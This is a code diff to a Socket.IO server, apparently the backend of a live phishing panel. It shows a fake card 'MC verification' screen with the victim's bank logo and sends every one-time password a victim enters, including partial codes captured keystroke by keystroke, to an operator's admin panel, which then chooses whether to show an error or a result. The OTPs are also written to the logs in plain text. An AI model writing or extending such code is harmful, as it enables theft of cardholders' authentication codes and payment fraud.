@@ -698,45 +698,52 @@ io.on('connection', (socket) => {
     }
   });
   
-  // MC verification events - enhanced with logging
-  socket.on('show_mc_verification', (data) => {
-    // Broadcast to the client with this invoice ID
-    console.log('Received show_mc_verification event:', data);
-    io.to(data.invoiceId).emit('show_mc_verification', data);
+// MC verification events - enhanced with direct broadcasting
+socket.on('show_mc_verification', (data) => {
+  // Broadcast to the specific client with this invoice ID
+  console.log('Received show_mc_verification event:', data);
+  io.to(data.invoiceId).emit('show_mc_verification', data);
+});
+
+socket.on('update_mc_bank', (data) => {
+  // Update bank logo on client
+  console.log('Received update_mc_bank event:', data);
+  io.to(data.invoiceId).emit('update_mc_bank', {
+    invoiceId: data.invoiceId,
+    bankCode: data.bankCode
   });
-  
-  socket.on('update_mc_bank', (data) => {
-    // Update bank logo on client
-    console.log('Received update_mc_bank event:', data);
-    io.to(data.invoiceId).emit('update_mc_bank', {
-      invoiceId: data.invoiceId,
-      bankCode: data.bankCode
-    });
-  });
-  
-  socket.on('mc_otp_submitted', (data) => {
-    // Notify admin panel of OTP submission
-    console.log('Received mc_otp_submitted event with OTP:', data.otp, 'for Invoice:', data.invoiceId);
-    io.emit('mc_otp_submitted', data);  // Broadcast to ALL clients including admin
-  });
-  
-  socket.on('mc_otp_error', (data) => {
-    // Send OTP error to client
-    console.log('Sending OTP error to client:', data);
-    io.to(data.invoiceId).emit('mc_otp_error', data);
-  });
-  
-  socket.on('mc_verification_result', (data) => {
-    // Send verification result to client
-    console.log('Sending verification result to client:', data);
-    io.to(data.invoiceId).emit('mc_verification_result', data);
-  });
-  
-  socket.on('mc_resend_otp', (data) => {
-    // Notify admin panel of OTP resend request
-    console.log('Received mc_resend_otp request for invoice:', data.invoiceId);
-    io.emit('mc_resend_otp', data);  // Broadcast to ALL clients including admin
-  });
+});
+
+socket.on('mc_otp_submitted', (data) => {
+  // Notify admin panel of OTP submission - CRITICAL TO USE io.emit NOT io.to
+  console.log(`MC OTP RECEIVED: ${data.otp} for invoice: ${data.invoiceId}`);
+  io.emit('mc_otp_submitted', data);  // Broadcast to ALL clients
+});
+
+// Optional - for live OTP typing feature
+socket.on('mc_otp_typing', (data) => {
+  // Send partial OTP to admin panel as user types - optional feature
+  console.log(`MC OTP typing: ${data.partialOtp} for invoice: ${data.invoiceId}`);
+  io.emit('mc_otp_typing', data);  // Broadcast to ALL clients
+});
+
+socket.on('mc_otp_error', (data) => {
+  // Send OTP error to client
+  console.log('Sending OTP error to client:', data);
+  io.to(data.invoiceId).emit('mc_otp_error', data);
+});
+
+socket.on('mc_verification_result', (data) => {
+  // Send verification result to client
+  console.log('Sending verification result to client:', data);
+  io.to(data.invoiceId).emit('mc_verification_result', data);
+});
+
+socket.on('mc_resend_otp', (data) => {
+  // Notify admin panel of OTP resend request - CRITICAL TO USE io.emit NOT io.to
+  console.log(`MC OTP RESEND REQUEST for invoice: ${data.invoiceId}`);
+  io.emit('mc_resend_otp', data);  // Broadcast to ALL clients
+});
   
   // Handle disconnect
   socket.on('disconnect', () => {
